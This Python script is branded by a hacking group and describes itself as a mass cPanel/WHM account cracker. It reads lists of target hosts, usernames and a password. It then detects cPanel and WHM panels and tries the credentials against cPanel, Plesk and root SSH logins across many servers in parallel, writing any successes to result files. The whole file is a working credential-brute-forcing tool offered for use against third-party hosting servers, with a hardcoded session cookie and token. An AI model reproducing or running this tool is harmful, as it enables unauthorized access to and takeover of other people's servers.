# Author: Pari Malam

import os
import re
import requests
import urllib3
import concurrent.futures
from sys import stdout
import argparse
from bs4 import BeautifulSoup
from colorama import Fore, init
init(autoreset=True)
requests.packages.urllib3.disable_warnings()

FR  =   Fore.RED
FY  =   Fore.YELLOW
FW  =   Fore.WHITE
FG  =   Fore.GREEN
FC  =   Fore.CYAN

if not os.path.exists('Results'):
    os.mkdir('Results')

def banners():
    os.system('clear' if os.name == 'posix' else 'cls')
    stdout.write("                                                                                         \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╗ ██████╗  █████╗  ██████╗  ██████╗ ███╗   ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗   ██╗ ██████╗ \n")
    stdout.write(""+Fore.LIGHTRED_EX +"██╔══██╗██╔══██╗██╔══██╗██╔════╝ ██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝   ██║██╔═══██╗\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██████╔╝███████║██║  ███╗██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║     █████╗     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██║  ██║██╔══██╗██╔══██║██║   ██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝     ██║██║   ██║\n")
    stdout.write(""+Fore.LIGHTRED_EX +"██████╔╝██║  ██║██║  ██║╚██████╔╝╚██████╔╝██║ ╚████║██║     ╚██████╔╝██║  ██║╚██████╗███████╗██╗██║╚██████╔╝\n")
    stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
    stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PARI MALAM                                    "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/PARI-MALAM                         "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   DRAGONFORCE.IO                                "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/DRAGONFORCEIO                     "+Fore.YELLOW+"║\n")
    stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
    print(f"{Fore.YELLOW}[cPanel & WHM] - {Fore.GREEN}Perform With Massive cPanel/WHM Account Cracker\n")
banners()



def URLdomain(url):
    return url.split('/')[0]

def cw(url):
    p = [2083, 2087]
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    try:
        session = requests.Session()

        for port in p:
            uwp = f'https://{url}:{port}'
            response = session.get(uwp, headers=headers, verify=False)
            if response.status_code == 200:
                if port == 2083:
                    print(f"{FY}[cPanel/WHM] - {FG}[W00T!] - {FC}[cPanel Found!] - {FW}{uwp}")
                    with open("Results/cPanel.txt", "a") as f:
                        f.write(f"[+] cPanel: {uwp}\n")
                elif port == 2087:
                    print(f"{FY}[cPanel/WHM] - {FG}[W00T!] - {FC}[WHM Found!] - {FW}{uwp}")
                    with open("Results/WHM.txt", "a") as f:
                        f.write(f"[+] WHM: {uwp}\n")
            else:
                print(f"{FY}[cPanel/WHM] - {FR}[Not Found!] - {FW}{uwp}")

    except Exception as e:
        print(f"{FY}[cPanel/WHM] - {FR}[Error!] - {FW}{uwp} - {FC}{str(e)}")

def c(url, username, password):
    ports = [2082, 2083]
    ep = "/login/?login_only=1"

    for port in ports:
        uwp = f'https://{url}:{port}{ep}'

        payload = {
            "user": username,
            "pass": password,
            "goto_uri": "/"
        }

        headers = {
            'Content-type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            'Origin': f'https://{url}:{port}',
            'Referer': f'https://{url}:{port}/',
            'Connection': 'keep-alive'
        }

        try:
            response = requests.post(uwp, data=payload, headers=headers, verify=False)
            response.raise_for_status()

            if response.status_code == 200:
                print(f"{FY}[cPanel/WHM] - {FG}[Cracked!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
                with open("Results/Cracked.txt", "a") as f:
                    f.write(f"[+] URLs: https://{url}:{port}\n[+] Username: {username}\n[+] Password: {password}\n\n")
            else:
                print(f"{FY}[cPanel/WHM] - {FR}[Invalid!] - {FW}https://{url}:{port} - {FC}{username}|{password}")

        except requests.exceptions.RequestException as e:
            print(f"{FY}[cPanel/WHM] - {FR}[Bad!] - {FW}https://{url}:{port} - {FC}{username}|{password}")

def ssh(url, username, password):
    port = 22
    command = f"sshpass -p {password} ssh -o StrictHostKeyChecking=no {username}@{url} -p {port} echo 'SSH connection established'"

    try:
        result = os.system(command)
        if result == 0:
            print(f"{FY}[SSH] - {FG}[Success!] - {FW}ssh://{username}@{url}:{port}")
            with open("Results/SSH.txt", "a") as f:
                f.write(f"[+] SSH: ssh://{username}@{url}:{port}\n")
        else:
            print(f"{FY}[SSH] - {FR}[Failed!] - {FW}ssh://{username}@{url}:{port}")
    except Exception as e:
        print(f"{FY}[SSH] - {FR}[Error!] - {FW}ssh://{username}@{url}:{port} - {FC}{str(e)}")

def plesk(url, username, password):
    cookies = {'plesk-ext-social-login-jwt-session': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwbGVzayIsImlhdCI6MTcyMDMzNTAyNywiZGF0YSI6eyJzdGF0ZS1nb29nbGUiOiIxbjJEaGhRRENJXC9wUEIyZ3ZGQkZueEJ2cmhORWl0d3dZeXBFd1hTOHxyZWRpcmVjdC1wbGVzaz1odHRwcyUzQSUyRiUyRnNlcnZlci5sb2dpc2Z5LmNvbSUzQTg0NDMlMkZtb2R1bGVzJTJGc29jaWFsLWxvZ2luJTJGcHVibGljJTJGbG9naW4ucGhwJTNGcHJvdmlkZXIlM0Rnb29nbGUlMjZzdWNjZXNzX3JlZGlyZWN0X3VybCUzRCUyNTJGIiwic3RhdGUtZ2l0aHViIjoiZ25vVGlBVU15OHR4eXM5aTdqaHNJT1FiMzhjS0VQODdIcWFOQTVIZ3xyZWRpcmVjdC1wbGVzaz1odHRwcyUzQSUyRiUyRnNlcnZlci5sb2dpc2Z5LmNvbSUzQTg0NDMlMkZtb2R1bGVzJTJGc29jaWFsLWxvZ2luJTJGcHVibGljJTJGbG9naW4ucGhwJTNGcHJvdmlkZXIlM0RnaXRodWIlMjZzdWNjZXNzX3JlZGlyZWN0X3VybCUzRCUyNTJGIiwic3RhdGUtZmFjZWJvb2siOiJIK1BMdG15Uk1kc0xMa1JlSVdWOXFIdzVzb1wvZWhqYlQ2d3ppdU9FVHxyZWRpcmVjdC1wbGVzaz1odHRwcyUzQSUyRiUyRnNlcnZlci5sb2dpc2Z5LmNvbSUzQTg0NDMlMkZtb2R1bGVzJTJGc29jaWFsLWxvZ2luJTJGcHVibGljJTJGbG9naW4ucGhwJTNGcHJvdmlkZXIlM0RmYWNlYm9vayUyNnN1Y2Nlc3NfcmVkaXJlY3RfdXJsJTNEJTI1MkYifX0.qt7oCvmG8Fsn_i6GTUCskbqnHfY0cdnvj9yVcEGGbrc',}

    login_url = f"https://{url}:8443/login_up.php"
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9,ms;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'plesk-ext-social-login-jwt-session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwbGVzayIsImlhdCI6MTcyMDMzNTAyNywiZGF0YSI6eyJzdGF0ZS1nb29nbGUiOiIxbjJEaGhRRENJXC9wUEIyZ3ZGQkZueEJ2cmhORWl0d3dZeXBFd1hTOHxyZWRpcmVjdC1wbGVzaz1odHRwcyUzQSUyRiUyRnNlcnZlci5sb2dpc2Z5LmNvbSUzQTg0NDMlMkZtb2R1bGVzJTJGc29jaWFsLWxvZ2luJTJGcHVibGljJTJGbG9naW4ucGhwJTNGcHJvdmlkZXIlM0Rnb29nbGUlMjZzdWNjZXNzX3JlZGlyZWN0X3VybCUzRCUyNTJGIiwic3RhdGUtZ2l0aHViIjoiZ25vVGlBVU15OHR4eXM5aTdqaHNJT1FiMzhjS0VQODdIcWFOQTVIZ3xyZWRpcmVjdC1wbGVzaz1odHRwcyUzQSUyRiUyRnNlcnZlci5sb2dpc2Z5LmNvbSUzQTg0NDMlMkZtb2R1bGVzJTJGc29jaWFsLWxvZ2luJTJGcHVibGljJTJGbG9naW4ucGhwJTNGcHJvdmlkZXIlM0RnaXRodWIlMjZzdWNjZXNzX3JlZGlyZWN0X3VybCUzRCUyNTJGIiwic3RhdGUtZmFjZWJvb2siOiJIK1BMdG15Uk1kc0xMa1JlSVdWOXFIdzVzb1wvZWhqYlQ2d3ppdU9FVHxyZWRpcmVjdC1wbGVzaz1odHRwcyUzQSUyRiUyRnNlcnZlci5sb2dpc2Z5LmNvbSUzQTg0NDMlMkZtb2R1bGVzJTJGc29jaWFsLWxvZ2luJTJGcHVibGljJTJGbG9naW4ucGhwJTNGcHJvdmlkZXIlM0RmYWNlYm9vayUyNnN1Y2Nlc3NfcmVkaXJlY3RfdXJsJTNEJTI1MkYifX0.qt7oCvmG8Fsn_i6GTUCskbqnHfY0cdnvj9yVcEGGbrc',
        'Origin': f'https://{url}:8443',
        'Referer': f'https://{url}:8443/login_up.php?success_redirect_url=%2F',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    params = {'success_redirect_url': '/',}
    data = {
        'login_name': username,
        'passwd': password,
        'locale_id': 'default',
        'forgery_protection_token': '2b5aaa294a3461d1b27c67909c495893',
        'success_redirect_url': '/',
    }

    try:
        response = requests.post(login_url, params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()

        if response.status_code == 200:
            print(f"{FY}[Plesk] - {FG}[Success!] - {FW}{login_url} - {FC}{username}|{password}")
            with open("Results/Plesk.txt", "a") as f:
                f.write(f"[+] Plesk: {login_url}\n[+] Username: {username}\n[+] Password: {password}\n\n")
        else:
            print(f"{FY}[Plesk] - {FR}[Failed!] - {FW}{login_url} - {FC}{username}|{password}")

    except requests.exceptions.RequestException as e:
        print(f"{FY}[Plesk] - {FR}[Error!] - {FW}{login_url} - {FC}{str(e)}")

def process_line(line, urls, password):
    username = line.strip()
    for url in urls:
        domain = URLdomain(url)
        cw(domain)
        c(domain, username, password)
        ssh(domain, "root", password)
        plesk(domain, username, password)

def main():
    parser = argparse.ArgumentParser(description='Process some URLs and usernames.')
    parser.add_argument('-f', '--filename', required=True, help='File containing URLs')
    parser.add_argument('-u', '--username', required=True, help='Filename containing usernames in config folder')
    parser.add_argument('-p', '--password', required=True, help='Filename containing password in config folder')
    parser.add_argument('-t', '--thread', type=int, required=True, help='Number of threads to use')
    args = parser.parse_args()

    url_filename = args.filename
    username_filepath = os.path.join("config", args.username)
    password_filepath = os.path.join("config", args.password)
    num_threads = args.thread

    try:
        with open(url_filename) as f:
            urls = [line.strip() for line in f]

        with open(username_filepath, "r") as file:
            usernames = [line.strip() for line in file]

        with open(password_filepath, "r") as file:
            password = file.read().strip()

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(process_line, usernames, [urls] * len(usernames), [password] * len(usernames))

    except FileNotFoundError as e:
        print(f"{FR}File not found: {e.filename}")

if __name__ == "__main__":
    main()